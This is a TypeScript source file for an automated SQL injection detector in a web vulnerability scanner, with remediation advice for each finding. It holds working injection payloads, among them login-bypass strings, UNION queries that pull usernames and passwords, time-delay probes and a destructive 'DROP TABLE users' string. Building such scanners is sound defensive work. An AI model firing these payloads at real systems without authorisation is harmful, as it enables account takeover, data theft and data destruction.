import { Page } from 'playwright';
import { IActiveDetector, ActiveDetectorContext } from '../../core/interfaces/IActiveDetector';
import { Vulnerability } from '../../types/vulnerability';
import { VulnerabilitySeverity, VulnerabilityCategory } from '../../types/enums';
import { AttackSurface, InjectionContext, AttackSurfaceType } from '../../scanners/active/DomExplorer';
import { PayloadInjector, InjectionResult, PayloadEncoding } from '../../scanners/active/PayloadInjector';
import { getOWASP2025Category } from '../../utils/cwe/owasp-2025-mapping';

/**
 * SQL Injection Detection Techniques
 */
export enum SqlInjectionTechnique {
  ERROR_BASED = 'error-based',
  BOOLEAN_BASED = 'boolean-based',
  TIME_BASED = 'time-based',
  UNION_BASED = 'union-based',
  STACKED_QUERIES = 'stacked-queries',
}

/**
 * SQL Injection Detector - Detects SQL injection vulnerabilities
 * Implements multiple detection techniques following OWASP guidelines
 */
export class SqlInjectionDetector implements IActiveDetector {
  readonly name = 'SQL Injection Detector';
  readonly description = 'Detects SQL injection vulnerabilities using multiple techniques';
  readonly version = '1.0.0';

  private injector: PayloadInjector;

  constructor() {
    this.injector = new PayloadInjector();
  }

  /**
   * Helper: Run a promise with timeout
   */
  private async withTimeout<T>(
    promise: Promise<T>, 
    timeoutMs: number, 
    label: string
  ): Promise<T | null> {
    const timeoutPromise = new Promise<null>((resolve) => {
      setTimeout(() => {
        console.log(`[SqlInjectionDetector] ${label} timed out after ${timeoutMs}ms`);
        resolve(null);
      }, timeoutMs);
    });
    
    return Promise.race([promise, timeoutPromise]);
  }

  /**
   * Detect SQL injection vulnerabilities
   */
  async detect(context: ActiveDetectorContext): Promise<Vulnerability[]> {
    const vulnerabilities: Vulnerability[] = [];
    const { page, attackSurfaces, baseUrl } = context;

    // Filter for SQL injection targets - include all form inputs, API params, and specific patterns
    const sqlTargets = attackSurfaces.filter((surface) => {
      const nameLower = surface.name.toLowerCase();
      
      // Include form inputs that could be SQL injectable
      const isFormInput = surface.type === AttackSurfaceType.FORM_INPUT;
      const isApiParam = surface.type === AttackSurfaceType.API_PARAM;
      const isJsonBody = surface.type === AttackSurfaceType.JSON_BODY;
      const isUrlParam = surface.type === AttackSurfaceType.URL_PARAMETER;
      
      // Context-based inclusion
      const isSqlContext = surface.context === InjectionContext.SQL;
      const isJsonContext = surface.context === InjectionContext.JSON;
      
      // Name-based inclusion for SQL-injectable fields
      const hasIdPattern = nameLower.includes('id');
      const hasSearchPattern = nameLower.includes('search') || nameLower.includes('query') || nameLower.includes('q');
      const hasAuthPattern = nameLower.includes('email') || nameLower.includes('user') || 
                             nameLower.includes('login') || nameLower.includes('username');
      const hasOrderPattern = nameLower.includes('order') || nameLower.includes('sort');
      
      // Skip non-injectable types
      const skipTypes = ['checkbox', 'radio', 'submit', 'button', 'file', 'image'];
      if (surface.metadata?.['inputType'] && skipTypes.includes(surface.metadata['inputType'] as string)) {
        return false;
      }
      
      return (isFormInput && (hasIdPattern || hasSearchPattern || hasAuthPattern || hasOrderPattern || isSqlContext)) ||
             isApiParam || isJsonBody || isUrlParam || isSqlContext || isJsonContext;
    });

    for (const surface of sqlTargets) {
      try {
        // Priority 1: Test for Authentication Bypass (Login SQLi) - fastest and most impactful
        if (
          (surface.type === 'form-input' || surface.type === 'json-body' || surface.type === 'api-param') && 
          (surface.name.includes('email') || surface.name.includes('user') || surface.name.includes('login'))
        ) {
           const authBypassVuln = await this.testAuthBypass(page, surface, baseUrl);
           if (authBypassVuln) {
             vulnerabilities.push(authBypassVuln);
             continue; // Found vulnerability, skip other tests for this surface
           }
        }
        
        // Priority 2: Test error-based (quick response-based check)
        const errorBasedVuln = await this.withTimeout(
          this.testErrorBased(page, surface, baseUrl), 
          15000, 
          'testErrorBased'
        );
        if (errorBasedVuln) {
          vulnerabilities.push(errorBasedVuln);
          continue; // Found vulnerability, skip other tests
        }

        // Priority 3: Boolean-based (may take longer)
        const booleanBasedVuln = await this.withTimeout(
          this.testBooleanBased(page, surface, baseUrl),
          20000,
          'testBooleanBased'
        );
        if (booleanBasedVuln) {
          vulnerabilities.push(booleanBasedVuln);
          continue;
        }

        // Priority 4: Time-based (slowest - intentional delays)
        // Skip time-based for form inputs on login pages (too slow)
        if (surface.type !== 'form-input') {
          const timeBasedVuln = await this.withTimeout(
            this.testTimeBased(page, surface, baseUrl),
            30000,
            'testTimeBased'
          );
          if (timeBasedVuln) vulnerabilities.push(timeBasedVuln);
        }

        // Skip UNION-based for now (complex, many payloads)
        // const unionBasedVuln = await this.testUnionBased(page, surface, baseUrl);
        
      } catch (error) {
        console.error(`Error testing SQL injection on ${surface.name}:`, error);
      }
    }

    return vulnerabilities;
  }

  /**
   * Test for Authentication Bypass (Login SQLi)
   */
  private async testAuthBypass(page: Page, surface: AttackSurface, baseUrl: string): Promise<Vulnerability | null> {
    const payloads = [
      "' OR 1=1--",
      "' OR '1'='1",
      "admin' --",
      "admin' #",
      "' OR true--"
    ];

    // Pre-fill password field with dummy value
    try {
      const passwordInput = await page.$('input[type="password"]');
      if (passwordInput) {
        await passwordInput.fill('password123');
      }
    } catch (e) { /* ignore */ }

    for (const payload of payloads) {
      const beforeUrl = page.url();
      let apiResponse: any = null;

      // Setup listener for login API response
      const responseListener = async (response: any) => {
        const url = response.url();
        if (url.includes('/login') && response.request().method() === 'POST') {
          try {
            // Skip redirect responses (3xx status codes)
            if (response.status() >= 300 && response.status() < 400) {
              return;
            }
            apiResponse = await response.json();
          } catch (e) {
            try {
              apiResponse = await response.text();
            } catch (textError) {
              // Response body unavailable (e.g., redirect), skip
              return;
            }
          }
        }
      };
      page.on('response', responseListener);

      // Use Promise.race to add timeout
      const injectPromise = this.injector.inject(page, surface, payload, {
        encoding: PayloadEncoding.NONE,
        submit: true,
        baseUrl,
      });
      
      const timeoutPromise = new Promise<any>((_, reject) => 
        setTimeout(() => reject(new Error('Injection timeout')), 10000)
      );
      
      let result;
      try {
        result = await Promise.race([injectPromise, timeoutPromise]);
      } catch (e) {
        page.off('response', responseListener);
        continue; // Try next payload
      }

      // Wait briefly for response listener to capture the response
      await page.waitForTimeout(500);
      
      page.off('response', responseListener);

      // Check 1: URL Redirect
      const afterUrl = page.url();
      const isRedirected = afterUrl !== beforeUrl && !afterUrl.includes('login');

      // Check 2: API Success (Token)
      const apiBody = JSON.stringify(apiResponse || {});
      const hasToken = apiBody.includes('token') || apiBody.includes('jwt') || apiBody.includes('"authentication":{');

      // Check 3: UI State Change (Logout button, Basket, etc.)
      const pageContent = await page.content();
      const isLoggedIn = pageContent.includes('Logout') || pageContent.includes('Your Basket') || pageContent.includes('account-name');

      if (isRedirected || hasToken || isLoggedIn) {
         const cwe = 'CWE-89';
         const owasp = getOWASP2025Category(cwe) || 'A03:2021';

         return {
            id: `sqli-auth-bypass-${Date.now()}`,
            title: 'SQL Injection (Authentication Bypass)',
            description: `Authentication bypass detected using SQL injection payload '${payload}' in field '${surface.name}'`,
            severity: VulnerabilitySeverity.CRITICAL,
            category: VulnerabilityCategory.INJECTION,
            cwe,
            owasp,
            url: result.response?.url || baseUrl,
            evidence: {
              request: { body: payload },
              response: { 
                body: apiBody.substring(0, 500),
                status: result.response?.status 
              },
              description: `Login successful. Token found: ${hasToken}, Redirect: ${isRedirected}, UI Change: ${isLoggedIn}`
            },
            remediation: 'Use parameterized queries for all authentication logic. Validate input types. Do not concatenate user input into SQL queries.',
            references: ['https://owasp.org/www-community/attacks/SQL_Injection'],
            timestamp: new Date()
         };
      }
    }
    return null;
  }

  /**
   * Test for error-based SQL injection
   */
  private async testErrorBased(page: Page, surface: AttackSurface, baseUrl: string): Promise<Vulnerability | null> {
    const payloads = [
      "'", // Single quote
      "''", // Double single quote
      "' OR '1'='1", // Classic OR injection
      "' OR 1=1--", // Comment-based
      "' OR 'a'='a", // Always true
      "' UNION SELECT NULL--", // Union attempt
      "' AND 1=0 UNION ALL SELECT 'admin', 'password'--", // Advanced union
      "' WAITFOR DELAY '0:0:5'--", // Time-based SQL Server
      "'; DROP TABLE users--", // Destructive (testing detection, not actual execution)
      "1' AND '1'='1", // Numeric with string
      "1 AND 1=1", // Numeric boolean
    ];

    const results = await this.injector.injectMultiple(page, surface, payloads, {
      encoding: PayloadEncoding.NONE,
      submit: true,
      baseUrl,
    });

    for (const result of results) {
      if (this.hasSqlError(result)) {
        return this.createVulnerability(surface, result, SqlInjectionTechnique.ERROR_BASED, baseUrl);
      }
    }

    return null;
  }

  /**
   * Test for boolean-based blind SQL injection
   */
  private async testBooleanBased(page: Page, surface: AttackSurface, baseUrl: string): Promise<Vulnerability | null> {
    // Test true vs false conditions with context-aware payloads
    const isNumeric = this.isNumericContext(surface);
    
    const truePayloads = isNumeric 
      ? ["1 OR 1=1", "1 OR 'a'='a", "1) OR (1=1"]
      : ["' OR '1'='1", "' OR 'a'='a", "') OR ('1'='1"];
      
    const falsePayloads = isNumeric
      ? ["1 AND 1=0", "1 AND 'a'='b", "1) AND (1=0"]
      : ["' AND '1'='2", "' AND 'a'='b", "') AND ('1'='2"];

    const trueResults = await this.injector.injectMultiple(page, surface, truePayloads, {
      encoding: PayloadEncoding.NONE,
      submit: true,
      baseUrl,
    });

    const falseResults = await this.injector.injectMultiple(page, surface, falsePayloads, {
      encoding: PayloadEncoding.NONE,
      submit: true,
      baseUrl,
    });

    // JSON-aware comparison for API endpoints
    if (this.isJsonResponse(trueResults[0]) || surface.type === AttackSurfaceType.API_PARAM || surface.type === AttackSurfaceType.JSON_BODY) {
      const jsonDiff = this.compareJsonResponses(trueResults, falseResults);
      if (jsonDiff.isSignificant && trueResults[0]) {
        return this.createVulnerability(surface, trueResults[0], SqlInjectionTechnique.BOOLEAN_BASED, baseUrl);
      }
    }

    // Fallback: Simple comparison for HTML responses
    const trueLengths = trueResults.map((r) => r.response?.body?.length || 0);
    const falseLengths = falseResults.map((r) => r.response?.body?.length || 0);

    const avgTrueLength = trueLengths.reduce((a, b) => a + b, 0) / trueLengths.length;
    const avgFalseLength = falseLengths.reduce((a, b) => a + b, 0) / falseLengths.length;

    const diff = Math.abs(avgTrueLength - avgFalseLength);
    const threshold = Math.max(avgTrueLength, avgFalseLength) * 0.1;

    if (diff > threshold && diff > 100 && trueResults[0]) {
      return this.createVulnerability(surface, trueResults[0], SqlInjectionTechnique.BOOLEAN_BASED, baseUrl);
    }

    return null;
  }

  /**
   * Test for time-based blind SQL injection
   */
  private async testTimeBased(page: Page, surface: AttackSurface, baseUrl: string): Promise<Vulnerability | null> {
    // Measure baseline (no payload) - retry 2 times for accuracy
    let baselineTime = 0;
    for (let i = 0; i < 2; i++) {
      const baselineStart = Date.now();
      await this.injector.inject(page, surface, surface.value || '', {
        encoding: PayloadEncoding.NONE,
        submit: true,
        baseUrl,
      });
      baselineTime += Date.now() - baselineStart;
    }
    baselineTime = baselineTime / 2; // Average

    const timePayloads = [
      "1' AND SLEEP(2)--", // MySQL - reduced to 2s
      "1'; WAITFOR DELAY '0:0:2'--", // SQL Server
      "1'||pg_sleep(2)--", // PostgreSQL
      "' AND SLEEP(2)--", // String context
    ];

    for (const payload of timePayloads) {
      const startTime = Date.now();
      const result = await this.injector.inject(page, surface, payload, {
        encoding: PayloadEncoding.NONE,
        submit: true,
        baseUrl,
      });
      const duration = Date.now() - startTime;

      // Compare to baseline: if >2x baseline AND >2s absolute, likely SQLi
      if (duration > baselineTime * 2 && duration > 2000) {
        return this.createVulnerability(surface, result, SqlInjectionTechnique.TIME_BASED, baseUrl);
      }
    }

    return null;
  }

  /**
   * Test for UNION-based SQL injection
   */
  private async testUnionBased(page: Page, surface: AttackSurface, baseUrl: string): Promise<Vulnerability | null> {
    const unionPayloads = [
      "' UNION SELECT NULL--",
      "' UNION SELECT NULL,NULL--",
      "' UNION SELECT NULL,NULL,NULL--",
      "' UNION SELECT 'a',NULL,NULL--",
      "' UNION ALL SELECT table_name,NULL,NULL FROM information_schema.tables--",
      "1' UNION SELECT username,password,NULL FROM users--",
    ];

    const results = await this.injector.injectMultiple(page, surface, unionPayloads, {
      encoding: PayloadEncoding.NONE,
      submit: true,
      baseUrl,
    });

    for (const result of results) {
      // Check for UNION success indicators
      if (
        result.response?.body?.includes('table_name') ||
        result.response?.body?.includes('username') ||
        result.response?.body?.includes('password') ||
        (result.response?.status === 200 && result.response?.body && result.response.body.length > 1000)
      ) {
        return this.createVulnerability(surface, result, SqlInjectionTechnique.UNION_BASED, baseUrl);
      }
    }

    return null;
  }

  /**
   * API boolean-based SQLi for JSON bodies and query params
   * Compares response bodies/status for true vs false conditions
   */
  private async testApiBooleanBased(page: Page, surface: AttackSurface, baseUrl: string): Promise<Vulnerability | null> {
    const isApiSurface = surface.type === AttackSurfaceType.API_PARAM || surface.type === AttackSurfaceType.JSON_BODY;
    if (!isApiSurface) return null;

    const isNumeric = this.isNumericContext(surface);
    const truePayloads = isNumeric ? ["1 OR 1=1", "1 OR 'a'='a'"] : ["' OR '1'='1", "' OR 'a'='a'"];
    const falsePayloads = isNumeric ? ["1 AND 1=0", "1 AND 'a'='b'"] : ["' AND '1'='2", "' AND 'a'='b'"];

    const trueResults = await this.injector.injectMultiple(page, surface, truePayloads, {
      encoding: PayloadEncoding.NONE,
      submit: true,
      baseUrl,
    });

    const falseResults = await this.injector.injectMultiple(page, surface, falsePayloads, {
      encoding: PayloadEncoding.NONE,
      submit: true,
      baseUrl,
    });

    // Simple comparison: check body length differences
    const trueLengths = trueResults.map((r) => r.response?.body?.length || 0);
    const falseLengths = falseResults.map((r) => r.response?.body?.length || 0);

    const avgTrueLength = trueLengths.reduce((a, b) => a + b, 0) / trueLengths.length;
    const avgFalseLength = falseLengths.reduce((a, b) => a + b, 0) / falseLengths.length;

    const diff = Math.abs(avgTrueLength - avgFalseLength);
    const threshold = Math.max(avgTrueLength, avgFalseLength) * 0.1;

    if (diff > threshold && diff > 100 && trueResults[0]) {
      return this.createVulnerability(surface, trueResults[0], SqlInjectionTechnique.BOOLEAN_BASED, baseUrl);
    }

    return null;
  }

  /**
   * API time-based SQLi for JSON bodies and query params
   * Measures response delays when using sleep/delay payloads
   */
  private async testApiTimeBased(page: Page, surface: AttackSurface, baseUrl: string): Promise<Vulnerability | null> {
    const isApiSurface = surface.type === AttackSurfaceType.API_PARAM || surface.type === AttackSurfaceType.JSON_BODY;
    if (!isApiSurface) return null;

    // Baseline measurement - average of 2 runs
    let baselineTime = 0;
    for (let i = 0; i < 2; i++) {
      const baselineStart = Date.now();
      await this.injector.inject(page, surface, surface.value || '', { encoding: PayloadEncoding.NONE, submit: true, baseUrl });
      baselineTime += Date.now() - baselineStart;
    }
    baselineTime = baselineTime / 2;

    const timePayloads = [
      "1' AND SLEEP(2)--",
      "' AND SLEEP(2)--",
      "1'; WAITFOR DELAY '0:0:2'--",
      "1)||pg_sleep(2)--",
    ];

    for (const payload of timePayloads) {
      const startTime = Date.now();
      const result = await this.injector.inject(page, surface, payload, {
        encoding: PayloadEncoding.NONE,
        submit: true,
        baseUrl,
      });
      const duration = Date.now() - startTime;

      if (duration > baselineTime * 2 && duration > 2000) {
        return this.createVulnerability(surface, result, SqlInjectionTechnique.TIME_BASED, baseUrl);
      }
    }

    return null;
  }

  /**
   * Analyze injection result for SQL injection indicators
   */
  async analyzeInjectionResult(result: InjectionResult): Promise<Vulnerability[]> {
    const vulnerabilities: Vulnerability[] = [];
    
    if (this.hasSqlError(result)) {
      const cwe = 'CWE-89';
      const owasp = getOWASP2025Category(cwe) || 'A03:2021';
      
      vulnerabilities.push({
        id: `sqli-${result.surface.name}-${Date.now()}`,
        title: 'SQL Injection Vulnerability',
        description: `SQL injection detected in ${result.surface.type} '${result.surface.name}'`,
        severity: VulnerabilitySeverity.CRITICAL,
        category: VulnerabilityCategory.INJECTION,
        cwe,
        owasp,
        evidence: {
          request: { body: result.payload },
          response: { body: result.response?.body?.substring(0, 500) || '' },
        },
        remediation: 'Use parameterized queries or prepared statements to prevent SQL injection. Replace string concatenation with parameterized queries, use ORM frameworks with built-in protection, validate and sanitize all user input.',
        references: [
          'https://owasp.org/Top10/A03_2021-Injection/',
          'https://cwe.mitre.org/data/definitions/89.html',
        ],
        timestamp: new Date(),
      });
    }

    return vulnerabilities;
  }

  /**
   * Validate vulnerability (re-test to confirm)
   */
  async validate(): Promise<boolean> {
    // Validation would require re-testing with stored context
    return true;
  }

  /**
   * Get payloads for this detector
   */
  getPayloads(): string[] {
    return [
      "'",
      "' OR '1'='1",
      "' OR 1=1--",
      "' UNION SELECT NULL--",
      "' AND SLEEP(5)--",
      "1' AND '1'='1",
      "1 AND 1=1",
      "'; DROP TABLE users--",
    ];
  }

  /**
   * Check if result contains SQL error indicators
   */
  private hasSqlError(result: InjectionResult): boolean {
    const body = result.response?.body?.toLowerCase() || '';
    const errorPatterns = [
      'sql syntax',
      'mysql_fetch',
      'mysqli',
      'sqlexception',
      'sequelizedatabaseerror',
      'sequelize',
      'sqlite_error',
      'sqlite_constraint',
      'sqlite error',
      'ora-',
      'postgresql',
      'sqlite',
      'mssql',
      'syntax error',
      'unclosed quotation',
      'quoted string not properly terminated',
      'database error',
      'odbc',
      'jdbc',
      'pdo',
      'you have an error in your sql',
      'warning: mysql',
      'uncaught exception',
      'pg_query',
      'pg_exec',
      'at .*\\.js:\\d+:\\d+', // Stack traces
      'typeorm',
      'prisma',
      'knex',
    ];

    return errorPatterns.some((pattern) => body.includes(pattern));
  }

  /**
   * Detect if value is numeric for context-aware payloads
   */
  private isNumericContext(surface: AttackSurface): boolean {
    const value = surface.value || surface.metadata['originalValue'] || '';
    const name = surface.name.toLowerCase();
    
    // Check if value is numeric
    if (/^\d+$/.test(String(value))) return true;
    
    // Check common numeric parameter names
    if (['id', 'userid', 'orderid', 'productid', 'quantity', 'page', 'limit', 'offset'].some(n => name.includes(n))) {
      return true;
    }
    
    return false;
  }

  /**
   * Check if response is JSON
   */
  private isJsonResponse(result: InjectionResult | undefined): boolean {
    if (!result?.response?.body) return false;
    try {
      JSON.parse(result.response.body);
      return true;
    } catch {
      return false;
    }
  }

  /**
   * Compare JSON responses for boolean-based SQLi
   */
  private compareJsonResponses(trueResults: InjectionResult[], falseResults: InjectionResult[]): { isSignificant: boolean; reason?: string } {
    try {
      // Parse first valid JSON from each set
      const trueJson = this.parseFirstValidJson(trueResults);
      const falseJson = this.parseFirstValidJson(falseResults);
      
      if (!trueJson || !falseJson) return { isSignificant: false };

      // Compare array lengths (e.g., data.length)
      const trueArrayLength = this.countArrayElements(trueJson);
      const falseArrayLength = this.countArrayElements(falseJson);
      
      if (trueArrayLength !== falseArrayLength && trueArrayLength > 0) {
        return { isSignificant: true, reason: `Array length differs: ${trueArrayLength} vs ${falseArrayLength}` };
      }

      // Compare status fields
      const trueStatus = this.extractStatus(trueJson);
      const falseStatus = this.extractStatus(falseJson);
      
      if (trueStatus && falseStatus && trueStatus !== falseStatus) {
        return { isSignificant: true, reason: `Status differs: ${trueStatus} vs ${falseStatus}` };
      }

      // Compare HTTP status codes
      const trueHttpStatus = trueResults[0]?.response?.status;
      const falseHttpStatus = falseResults[0]?.response?.status;
      
      if (trueHttpStatus && falseHttpStatus && trueHttpStatus !== falseHttpStatus) {
        return { isSignificant: true, reason: `HTTP status differs: ${trueHttpStatus} vs ${falseHttpStatus}` };
      }

      return { isSignificant: false };
    } catch (error) {
      return { isSignificant: false };
    }
  }

  /**
   * Parse first valid JSON from results
   */
  private parseFirstValidJson(results: InjectionResult[]): any {
    for (const result of results) {
      try {
        if (result.response?.body) {
          return JSON.parse(result.response.body);
        }
      } catch {
        continue;
      }
    }
    return null;
  }

  /**
   * Count array elements in JSON response
   */
  private countArrayElements(json: any): number {
    if (Array.isArray(json)) return json.length;
    if (json && typeof json === 'object') {
      // Look for common array keys
      const arrayKeys = ['data', 'results', 'items', 'products', 'users'];
      for (const key of arrayKeys) {
        if (Array.isArray(json[key])) {
          return json[key].length;
        }
      }
    }
    return 0;
  }

  /**
   * Extract status field from JSON
   */
  private extractStatus(json: any): string | null {
    if (json && typeof json === 'object') {
      return json.status || json.statusCode || json.state || null;
    }
    return null;
  }

  /**
   * Create vulnerability object
   */
  private createVulnerability(
    surface: AttackSurface,
    result: InjectionResult,
    technique: SqlInjectionTechnique,
    baseUrl: string
  ): Vulnerability {
    const techniqueDescriptions = {
      [SqlInjectionTechnique.ERROR_BASED]: 'Error-based SQL injection detected through database error messages',
      [SqlInjectionTechnique.BOOLEAN_BASED]: 'Boolean-based blind SQL injection detected through differential responses',
      [SqlInjectionTechnique.TIME_BASED]: 'Time-based blind SQL injection detected through response delays',
      [SqlInjectionTechnique.UNION_BASED]: 'UNION-based SQL injection detected through query stacking',
      [SqlInjectionTechnique.STACKED_QUERIES]: 'Stacked queries SQL injection detected',
    };

    const cwe = 'CWE-89';
    const owasp = getOWASP2025Category(cwe) || 'A03:2021';

    return {
      id: `sqli-${technique}-${surface.name}-${Date.now()}`,
      title: `SQL Injection (${technique})`,
      description: techniqueDescriptions[technique] + ` in ${surface.type} '${surface.name}'`,
      severity: VulnerabilitySeverity.CRITICAL,
      category: VulnerabilityCategory.INJECTION,
      cwe,
      owasp,
      url: result.response?.url || baseUrl,
      evidence: {
        request: { body: result.payload },
        response: { 
          body: result.response?.body?.substring(0, 1000) || '',
          status: result.response?.status,
        },
      },
      remediation: 'Use parameterized queries or prepared statements. Replace string concatenation with parameterized queries, use ORM frameworks with built-in SQL injection protection, validate and sanitize all user input, apply principle of least privilege to database accounts.',
      references: [
        'https://owasp.org/www-community/attacks/SQL_Injection',
        'https://cwe.mitre.org/data/definitions/89.html',
        'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html',
      ],
      timestamp: new Date(),
    };
  }
}
